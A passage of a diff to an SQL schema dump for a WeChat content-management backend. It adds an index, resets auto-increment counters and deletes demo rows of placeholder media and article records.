   INDEX `index_wechat_media_type`(`type`) USING BTREE,
+  INDEX `index_wechat_media_appid`(`appid`) USING BTREE,
   INDEX `index_wechat_media_media_id`(`media_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-素材' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-素材' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of wechat_media
 -- ----------------------------
-INSERT INTO `wechat_media` VALUES (1, 'wxa7460c47381dc523', '243cc03c4e22ebe9f00d03a90881ed88', 'image', 'jcixc7n4IDYPggRMks5iCNdAzyOgF6RckbCaFiYVqg0', 'https://v6.thinkadmin.top/upload/23/554300e8dea1ac2c668761a197c54b.png', 'http://mmbiz.qpic.cn/mmbiz_png/kmaMP2EtVc1OYMUFYnZRc23MddIibPxy0jdaqkaEkaL4rdvZxSRh2m3DWAOSP5Bk9ichRQTJ8WZ8Y1KUBWIkeWyQ/0?wx_fmt=png', '2021-01-18 12:25:01');
-INSERT INTO `wechat_media` VALUES (2, 'wx60a43dd8161666d4', '243cc03c4e22ebe9f00d03a90881ed88', 'image', 'Bw3hChJY74VW97EwV7b79Sxid83-OrizvN3dcOaayV8', 'https://v6.thinkadmin.top/upload/23/554300e8dea1ac2c668761a197c54b.png', 'http://mmbiz.qpic.cn/sz_mmbiz_png/nMCGwywCQYIMibad5K9KGv2q2kxF8PkaJicgalPBsLPiaCJVCN0sFzHkgqgq8j5l4oM5BgTJ5r0Y6Ria5baicCIQe4g/0?wx_fmt=png', '2021-01-21 12:09:59');
-INSERT INTO `wechat_media` VALUES (3, 'wx60a43dd8161666d4', '294f11e7e0f39f9d7fdb2b4c40fbe9da', 'image', 'Bw3hChJY74VW97EwV7b79dwegAP13Z30MSzCqsNecUU', 'https://v6.thinkadmin.top/upload/c7/e22be7282d97dcd4c8b2991fc2d494.png', 'http://mmbiz.qpic.cn/sz_mmbiz_png/nMCGwywCQYKzVDB4b9Bv3WZrHCMhhVmcEekEkcmvCQ2xicsicmfAwn8gaQSarvJ58WX6Lwrcs6DicMAvEcAC4ufrg/0?wx_fmt=png', '2021-02-05 15:47:49');
 
 -- ----------------------------
 -- Table structure for wechat_news
@@ -6516,21 +4956,13 @@ CREATE TABLE `wechat_news`  (
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   `create_by` bigint(20) NULL DEFAULT NULL COMMENT '创建人',
   PRIMARY KEY (`id`) USING BTREE,
-  INDEX `index_wechat_news_artcle_id`(`article_id`) USING BTREE,
-  INDEX `index_wechat_news_media_id`(`media_id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-图文' ROW_FORMAT = Compact;
+  INDEX `index_wechat_news_media_id`(`media_id`) USING BTREE,
+  INDEX `index_wechat_news_artcle_id`(`article_id`) USING BTREE
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-图文' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of wechat_news
 -- ----------------------------
-INSERT INTO `wechat_news` VALUES (1, '', '', '1', 1, '2021-01-08 16:47:21', 10000);
-INSERT INTO `wechat_news` VALUES (2, '', '', '2,3', 1, '2021-01-09 12:40:57', 10000);
-INSERT INTO `wechat_news` VALUES (3, '', '', '5', 1, '2021-01-19 23:48:12', 10000);
-INSERT INTO `wechat_news` VALUES (4, '', '', '6,7,8', 1, '2021-01-24 15:01:31', 10000);
-INSERT INTO `wechat_news` VALUES (5, '', '', '9', 1, '2021-01-26 23:46:11', 10000);
-INSERT INTO `wechat_news` VALUES (6, '', '', '10,11,12', 1, '2021-01-28 21:09:55', 10000);
-INSERT INTO `wechat_news` VALUES (7, '', '', '13,14,15,16', 1, '2021-01-28 21:10:27', 10000);
-INSERT INTO `wechat_news` VALUES (8, '', '', '17', 0, '2021-02-18 18:50:46', 10000);
 
 -- ----------------------------
 -- Table structure for wechat_news_article
@@ -6548,27 +4980,10 @@ CREATE TABLE `wechat_news_article`  (
   `read_num` bigint(20) UNSIGNED NULL DEFAULT 0 COMMENT '阅读数量',
   `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 18 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-文章' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '微信-文章' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of wechat_news_article
 -- ----------------------------
-INSERT INTO `wechat_news_article` VALUES (1, '新建图文', 'https://v6.thinkadmin.top/upload/04/4ff438ef6e09e9f4e672ef7072af61.png', 0, '管理员', 'sdfsdfsdf', '<p>sdfsdfsdf</p>', 'https://www.baidu.com', 2, '2021-01-08 16:47:36');
-INSERT INTO `wechat_news_article` VALUES (2, '新建图文', 'https://v6.thinkadmin.top/upload/c6/3587945bd0d163216181290b67044c.jpg', 0, '管理员', '文章内容', '<h1 id=\"\\&quot;km6te\\&quot;\">文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容</h1>\n\n<h3 id=\"\\&quot;t7st7\\&quot;\">文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容</h3>\n\n<p><span><img alt=\"\" src=\"https://v6.thinkadmin.top/upload/aa/2b668173b917b4e5e4f9a687afc052.png\" style=\"max-width:100%;border:0\" /></span></p>\n\n<p center=\"\" style=\"text-align: center;\">文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容文章内容</p>', '', 48, '2021-01-26 02:42:56');
-INSERT INTO `wechat_news_article` VALUES (3, '新建图文', 'https://v6.thinkadmin.top/upload/e4/fc4b856c6918d017c63e8d81faac1a.jpg', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 26, '2021-01-26 02:42:56');
-INSERT INTO `wechat_news_article` VALUES (4, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容fdsafds', '<p>文章内容fdsafds</p>', '', 12, '2021-01-15 17:25:23');
-INSERT INTO `wechat_news_article` VALUES (5, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 7, '2021-01-19 23:48:12');
-INSERT INTO `wechat_news_article` VALUES (6, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 2, '2021-01-24 15:01:31');
-INSERT INTO `wechat_news_article` VALUES (7, '新建图文222', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 2, '2021-01-24 15:01:31');
-INSERT INTO `wechat_news_article` VALUES (8, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 0, '2021-01-24 15:01:31');
-INSERT INTO `wechat_news_article` VALUES (9, '新建图文', 'https://v6.thinkadmin.top/upload/d5/fb34d8665f0cf1b2aa24d914f9fed3.jpg', 0, '问问', '文章内容wwwwwwwwww', '<p>文章内容wwwwwwwwww</p>', 'https://www.baidu.com', 9, '2021-01-27 10:15:00');
-INSERT INTO `wechat_news_article` VALUES (10, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 0, '2021-01-28 21:09:55');
-INSERT INTO `wechat_news_article` VALUES (11, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '文章内容', '', 0, '2021-01-28 21:09:55');
-INSERT INTO `wechat_news_article` VALUES (12, '新建图文', 'https://v6.thinkadmin.top/static/theme/img/image.png', 0, '管理员', '文章内容', '文章内容', '', 0, '2021-01-28 21:09:55');
-INSERT INTO `wechat_news_article` VALUES (13, '新建图文', 'https://v6.thinkadmin.top/upload/aa/0c0058ad735f5f37ec9b548eb4cd91.jpg', 1, '管理员', '文章内容333', '<p>文章内容222</p>', '', 22, '2021-02-04 14:37:43');
-INSERT INTO `wechat_news_article` VALUES (14, '新建图文', 'https://v6.thinkadmin.top/upload/aa/0c0058ad735f5f37ec9b548eb4cd91.jpg', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 15, '2021-02-04 14:37:43');
-INSERT INTO `wechat_news_article` VALUES (15, '新建图文', 'https://v6.thinkadmin.top/upload/aa/0c0058ad735f5f37ec9b548eb4cd91.jpg', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 3, '2021-02-04 14:37:43');
-INSERT INTO `wechat_news_article` VALUES (16, '新建图文', 'https://v6.thinkadmin.top/upload/aa/0c0058ad735f5f37ec9b548eb4cd91.jpg', 0, '管理员', '文章内容', '<p>文章内容</p>', '', 0, '2021-02-04 14:37:43');
-INSERT INTO `wechat_news_article` VALUES (17, '新建图文1', 'https://v6.thinkadmin.top/upload/5b/def1fc7bf2c7b669a1399c27582939.jpg', 0, '管理员', '文章内容', '<p>文章内容111</p>', '', 6, '2021-02-19 17:03:07');
 
 SET FOREIGN_KEY_CHECKS = 1;
